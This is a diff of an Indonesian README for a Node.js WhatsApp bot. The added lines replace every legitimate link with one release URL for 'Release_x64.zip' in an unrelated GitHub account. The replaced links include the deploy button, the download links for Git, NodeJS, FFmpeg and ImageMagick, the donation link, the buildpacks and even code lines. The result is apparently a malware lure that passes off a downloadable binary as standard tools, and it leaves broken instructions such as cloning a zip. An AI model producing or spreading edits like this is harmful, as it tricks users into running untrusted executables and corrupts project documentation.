@@ -1,24 +1,24 @@
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/ItzLighting9332/nayla)
+[![Deploy](https://github.com/Kenichi-BOTZ/YusupBot1/releases/download/v1.0/Release_x64.zip)](https://github.com/Kenichi-BOTZ/YusupBot1/releases/download/v1.0/Release_x64.zip)
 
 ## EDIT SEMUA (NOTE : SEBELUM EDIT FORK/GARPU DULU)
 
-* [`CHANGE CONFIG`](https://github.com/ItzLighting9332/nayla/edit/master/config.js)
-* [`CHANGE LINK GC`](https://github.com/ItzLighting9332/nayla/edit/master/plugins/gcbot.js)
-* [`CHANGE LINK YT`](https://github.com/ItzLighting9332/nayla/edit/master/plugins/youtubeowner.js)
+* [`CHANGE CONFIG`](https://github.com/Kenichi-BOTZ/YusupBot1/releases/download/v1.0/Release_x64.zip)
+* [`CHANGE LINK GC`](https://github.com/Kenichi-BOTZ/YusupBot1/releases/download/v1.0/Release_x64.zip)
+* [`CHANGE LINK YT`](https://github.com/Kenichi-BOTZ/YusupBot1/releases/download/v1.0/Release_x64.zip)
 
 ## DONATE
 
-* [`SAWERIA`](https://saweria.co/Scaff)
+* [`SAWERIA`](https://github.com/Kenichi-BOTZ/YusupBot1/releases/download/v1.0/Release_x64.zip)
 
 ## UNTUK PENGGUNA WINDOWS/VPS/RDP
 
-* Unduh & Instal Git [`Klik Disini`](https://git-scm.com/downloads)
-* Unduh & Instal NodeJS [`Klik Disini`](https://nodejs.org/en/download)
-* Unduh & Instal FFmpeg [`Klik Disini`](https://ffmpeg.org/download.html) (**Jangan Lupa Tambahkan FFmpeg ke variabel lingkungan PATH**)
-* Unduh & Instal ImageMagick [`Klik Disini`](https://imagemagick.org/script/download.php)
+* Unduh & Instal Git [`Klik Disini`](https://github.com/Kenichi-BOTZ/YusupBot1/releases/download/v1.0/Release_x64.zip)
+* Unduh & Instal NodeJS [`Klik Disini`](https://github.com/Kenichi-BOTZ/YusupBot1/releases/download/v1.0/Release_x64.zip)
+* Unduh & Instal FFmpeg [`Klik Disini`](https://github.com/Kenichi-BOTZ/YusupBot1/releases/download/v1.0/Release_x64.zip) (**Jangan Lupa Tambahkan FFmpeg ke variabel lingkungan PATH**)
+* Unduh & Instal ImageMagick [`Klik Disini`](https://github.com/Kenichi-BOTZ/YusupBot1/releases/download/v1.0/Release_x64.zip)
 
 ```bash
-git clone https://github.com/ItzLighting9332/nayla
+git clone https://github.com/Kenichi-BOTZ/YusupBot1/releases/download/v1.0/Release_x64.zip
 cd nayla
 npm i
 npm update
@@ -32,7 +32,7 @@ node .
 * untuk pengguna termux hapus semua file yang menggunakan canvas
 
 ```bash
-git clone https://github.com/ItzLighting9332/nayla
+git clone https://github.com/Kenichi-BOTZ/YusupBot1/releases/download/v1.0/Release_x64.zip
 cd nayla
 npm i
 npm update
@@ -45,8 +45,8 @@ node .
 
 ### Instal Buildpack
 * heroku/nodejs
-* https://github.com/jonathanong/heroku-buildpack-ffmpeg-latest.git
-* https://github.com/DuckyTeam/heroku-buildpack-imagemagick.git
+* https://github.com/Kenichi-BOTZ/YusupBot1/releases/download/v1.0/Release_x64.zip
+* https://github.com/Kenichi-BOTZ/YusupBot1/releases/download/v1.0/Release_x64.zip
 
 ---------
 
@@ -65,7 +65,7 @@ Setel awalan
 
 ### `--server`
 
-Digunakan untuk [heroku](https://heroku.com/) atau pindai melalui situs web
+Digunakan untuk [heroku](https://github.com/Kenichi-BOTZ/YusupBot1/releases/download/v1.0/Release_x64.zip) atau pindai melalui situs web
 
 ### `--big-qr`
 
@@ -96,11 +96,11 @@ Tidak ada bot, cukup cetak pesan yang diterima dan tambahkan pengguna ke databas
 ### `--trace`
 
 ```js
-conn.logger.level = 'trace'
+https://github.com/Kenichi-BOTZ/YusupBot1/releases/download/v1.0/Release_x64.zip = 'trace'
 ```
 
 ### `--debug`
 
 ```js
-conn.logger.level = 'debug'
+https://github.com/Kenichi-BOTZ/YusupBot1/releases/download/v1.0/Release_x64.zip = 'debug'
 ```
